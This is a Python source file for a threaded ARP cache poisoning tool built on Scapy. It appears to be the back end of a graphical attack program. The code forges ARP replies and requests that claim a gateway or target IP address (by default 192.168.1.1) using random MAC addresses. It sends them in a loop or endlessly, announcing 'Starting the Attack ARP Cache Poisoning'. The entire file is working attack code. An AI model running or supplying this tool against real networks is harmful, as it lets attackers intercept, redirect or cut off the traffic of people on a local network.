import time
import random
import threading
from scapy.all import *
import arp_spoof_graphique
import sys

class arp_spoof(threading.Thread):

	
	#def __init__:
	#	self.stop=False

	def __init__(self,ip_src,ip_dst,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
		#self.stopper.set(True)
		
		#tcp_syn_graphique_2.verrou=threading.Lock()
		

		
			
		#if(tcp_syn_graphique_2.test_fenetre.check_verrou()):	
		#	print("\n ERREUR ATTAQUE EN COURS DETECTEE")
		#	sys.exit(1)	
		#else:
		#	print("\n AUCUNE ATTAQUE EN COURS DETECTEE")
		#	tcp_syn_graphique_2.edit_verrou(True)	
				
		
		#self.arret=True
		#self._stopevent=threading.Event()
		##TEST DE L'ADRESSE IP SOURCE
				
		self.ip_src=ip_src

		if(ip_src == ""):

			if(ip_dst==""):
				self.arp=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at", hwsrc=self.randommac(),psrc="192.168.1.1")
			else:
				self.arp=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at", hwsrc=self.randommac(),psrc=ip_dst)
		else:
			if(ip_dst==""):
				self.arp=ARP(op="who-has",hwsrc=self.randommac(),psrc="192.168.1.1",pdst=ip_src)
			else:
				self.arp=ARP(op="who-has",hwsrc=self.randommac(),psrc=ip_dst,pdst=ip_src)

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
		else:
			print("interface chosen automatically")


		if(interface != ""):
			print("PACKETS SENDING INTERFACE:"+interface)
		else:
			print("PACKETS SENDING INTERFACE:"+conf.iface)

		

		print("interface="+interface)
		
		print ("conf.iface="+conf.iface)


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)

		#print("ip spoure="+self.ip.src)
		#print("port spoure="+str(self.p1)+"-"+str(self.p2))
		#print("ip destination="+str(self.ip.dst))
		#print("port destination="+str(port_dst))

	def run(self):	
		
		print("etat du verrou="+str(arp_spoof_graphique.verrou.locked()))
		if(arp_spoof_graphique.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")
			#sys.exit(1)
		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			arp_spoof_graphique.verrou.acquire()

			

			#print("ip spoure="+self.ip.src)
			#print("port spoure="+str(self.p1)+"-"+str(self.p2))
			#print("ip destination="+str(self.ip.dst))
			#print("port destination="+str(self.portdst))	
			
			self.arp.show()	
		
			time.sleep(3)
			#self.arret=False
			
			print("\n Starting the Attack ARP Cache Poisoning --"+time.ctime()+"\n")

			if(self.ip_src==""):			

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
					#while(1==1 and not(self.arret)):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						#'''CREATION DU PAQUET'''
						#paquet=(self.ip/tcp_syn)
					
						sendp(self.arp)
						time.sleep(self.delai)
				
						#print(self.stopper.set())

					#print("Fin des Traitements, arret de l'attaque")
					#print("arret="+str(self.arret))
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						#'''CREATION DU PAQUET'''
						#paquet=(self.ip/tcp_syn)
						sendp(self.arp)
						time.sleep(self.delai)
						#self.arret=True
						#print(self.arret)
						#print(self.stopper.set())
				
						#if(self.arret==True):
						if(self.stopper.isSet()):
							break
					#print("arret="+str(self.arret))
					#print("Fin des Traitements, arret de l'attaque")
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
			else:

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
					#while(1==1 and not(self.arret)):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						#'''CREATION DU PAQUET'''
						#paquet=(self.ip/tcp_syn)
					
						send(self.arp)
						time.sleep(self.delai)
				
						#print(self.stopper.set())

					#print("Fin des Traitements, arret de l'attaque")
					#print("arret="+str(self.arret))
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						#'''CREATION DU PAQUET'''
						#paquet=(self.ip/tcp_syn)
						send(self.arp)
						time.sleep(self.delai)
						#self.arret=True
						#print(self.arret)
						#print(self.stopper.set())
				
						#if(self.arret==True):
						if(self.stopper.isSet()):
							break
					#print("arret="+str(self.arret))
					#print("Fin des Traitements, arret de l'attaque")
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			arp_spoof_graphique.verrou.release()
				#tcp_syn_graphique_2.edit_verrou(False)

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		#self.arret=True
		self.stopper.set()
		#print(self.arret)
		#print(self.stopper.set())
	
	def randommac(self):
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
